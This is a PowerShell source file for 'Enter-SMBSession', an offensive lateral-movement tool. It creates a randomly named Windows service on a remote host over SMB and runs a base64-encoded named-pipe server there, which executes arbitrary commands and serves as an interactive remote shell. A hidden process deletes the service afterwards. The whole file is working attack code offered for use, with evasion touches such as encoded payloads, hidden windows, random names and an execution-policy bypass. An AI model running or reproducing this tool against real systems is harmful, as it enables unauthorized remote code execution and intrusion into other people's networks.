function Enter-SMBSession {
	
	<#

	.SYNOPSIS
	Invoke-SMBRemoting Author: Rob LP (@L3o4j)
	https://github.com/Leo4j/Invoke-SMBRemoting

	.DESCRIPTION
	Command Execution or Interactive Shell over Named-Pipes
	The user you run the script as needs to be Administrator over the ComputerName
	
	.PARAMETER ComputerName
	The Server HostName or IP to connect to
	
	.PARAMETER PipeName
	Specify the Pipe Name
	
	.PARAMETER ServiceName
	Specify the Service Name
	
	.PARAMETER Command
	Specify a command to run instead of getting a Shell
	
	.PARAMETER Verbose
	Show Pipe and Service Name info
	
	.EXAMPLE
	Enter-SMBSession -ComputerName "Workstation-01.ferrari.local"
	Enter-SMBSession -ComputerName "Workstation-01.ferrari.local" -Command whoami
 	Enter-SMBSession -ComputerName "Workstation-01.ferrari.local" -PipeName Something -ServiceName RandomService
	Enter-SMBSession -ComputerName "Workstation-01.ferrari.local" -PipeName Something -ServiceName RandomService -Command whoami
	
	#>

	param (
		[string]$PipeName,
		[string]$ComputerName,
		[string]$ServiceName,
		[string]$Command,
		[switch]$Verbose
	)
	
	$ErrorActionPreference = "SilentlyContinue"
	$WarningPreference = "SilentlyContinue"
	Set-Variable MaximumHistoryCount 32767
	
	if (-not $ComputerName) {
		Write-Output " [-] Please specify a Target"
		return
	}
	
	if(!$PipeName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$PipeName = $randomvalue
	}
	
	if(!$ServiceName){
		$randomvalue = ((65..90) + (97..122) | Get-Random -Count 16 | % {[char]$_})
		$randomvalue = $randomvalue -join ""
		$ServiceName = "Service_" + $randomvalue
	}
	
	$ServerScript = @"
`$pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream("$PipeName", 'InOut', 1, 'Byte', 'None', 1024, 1024, `$null)

`$pipeServer.WaitForConnection()

`$sr = New-Object System.IO.StreamReader(`$pipeServer)
`$sw = New-Object System.IO.StreamWriter(`$pipeServer)

while (`$true) {
	`$command = `$sr.ReadLine()

	if (`$command -eq "exit") {
		`$sw.WriteLine("Exiting...")
		`$sw.Flush()
		break
	} else {
		`$result = Invoke-Expression `$command

		if (`$result -is [System.Array]) {
			foreach (`$line in `$result) {
				`$sw.WriteLine(`$line)
			}
		} else {
			`$sw.WriteLine(`$result)
		}

		`$sw.WriteLine("###END###")  # Delimiter indicating end of command result
		`$sw.Flush()
	}
}

`$pipeServer.Disconnect()
`$sr.Close()
`$sw.Close()
"@
	
	$B64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))
	
	$FullCommand = "`$encstring = `"$B64ServerScript`"; `$decodedstring = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$encstring)); Invoke-Expression `$decodedstring"
	
	$b64command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($FullCommand))
	
	$arguments = "\\$ComputerName create $ServiceName binpath= `"C:\Windows\System32\cmd.exe /c powershell.exe -enc $b64command`""
	
	$startarguments = "\\$ComputerName start $ServiceName"
	
	Start-Process sc.exe -ArgumentList $arguments -WindowStyle Hidden
	
	Start-Sleep -Milliseconds 200
	
	Start-Process sc.exe -ArgumentList $startarguments -WindowStyle Hidden
	
	if($Verbose){
		Write-Output ""
		Write-Output " [+] Pipe Name: $PipeName"
		Write-Output ""
		Write-Output " [+] Service Name: $ServiceName"
		Write-Output ""
		Write-Output " [+] Creating Service on Remote Target..."
	}
	Write-Output ""
	
	# Get the current process ID
	$currentPID = $PID
	
	# Embedded monitoring script
	$monitoringScript = @"
`$serviceToDelete = "$ServiceName" # Name of the service you want to delete
`$TargetServer = "$ComputerName"
`$primaryScriptProcessId = $currentPID

while (`$true) {
	Start-Sleep -Seconds 5 # Check every 5 seconds

	# Check if the primary script is still running using its Process ID
	`$process = Get-Process | Where-Object { `$_.Id -eq `$primaryScriptProcessId }

	if (-not `$process) {
		# If the process is not running, delete the service
		`$stoparguments = "\\`$TargetServer delete `$serviceToDelete"
		Start-Process sc.exe -ArgumentList `$stoparguments -WindowStyle Hidden
		break # Exit the monitoring script
	}
}
"@
	
	$b64monitoringScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($monitoringScript))
	
	# Execute the embedded monitoring script in a hidden window
	Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -enc $b64monitoringScript" -WindowStyle Hidden
	
	$pipeClient = New-Object System.IO.Pipes.NamedPipeClientStream("$ComputerName", $PipeName, 'InOut')
	$pipeClient.Connect()

	$sr = New-Object System.IO.StreamReader($pipeClient)
	$sw = New-Object System.IO.StreamWriter($pipeClient)

	$serverOutput = ""
	
	try{
		if ($Command) {
			$fullCommand = "$Command | Out-String"
			$sw.WriteLine($fullCommand)
			$sw.Flush()
			while ($true) {
				$line = $sr.ReadLine()
				if ($line -eq "###END###") {
					Write-Output $serverOutput.Trim()
					Write-Output ""
					return
				} else {
					$serverOutput += "$line`n"
				}
			}
		} 
		
		else {
			while ($true) {
				
				# First, fetch the current remote path
				$sw.WriteLine("(Get-Location).Path | Out-String")
				$sw.Flush()
				
				$remotePath = ""
				while ($true) {
					$line = $sr.ReadLine()

					if ($line -eq "###END###") {
						# Remove any extraneous whitespace, newlines etc.
						$remotePath = $remotePath.Trim()
						break
					} else {
						$remotePath += "$line`n"
					}
				}
				
				$computerNameOnly = $ComputerName -split '\.' | Select-Object -First 1
				$promptString = "[$computerNameOnly]: PS $remotePath> "
				Write-Host -NoNewline $promptString
				$userCommand = [Console]::ReadLine()
				$fullCommand = "$userCommand | Out-String"
				$sw.WriteLine($fullCommand)
				$sw.Flush()

				if ($userCommand -eq "exit") {
					Write-Output ""
					break
				}
				
				Write-Output ""

				$serverOutput = ""
				while ($true) {
					$line = $sr.ReadLine()

					if ($line -eq "###END###") {
						Write-Output $serverOutput.Trim()
						Write-Output ""
						break
					} else {
						$serverOutput += "$line`n"
					}
				}
			}
		}
	}
	
	finally{
		$stoparguments = "\\$ComputerName delete $ServiceName"
		Start-Process sc.exe -ArgumentList $stoparguments -WindowStyle Hidden
		if ($sw) { $sw.Close() }
		if ($sr) { $sr.Close() }
	}
	
}
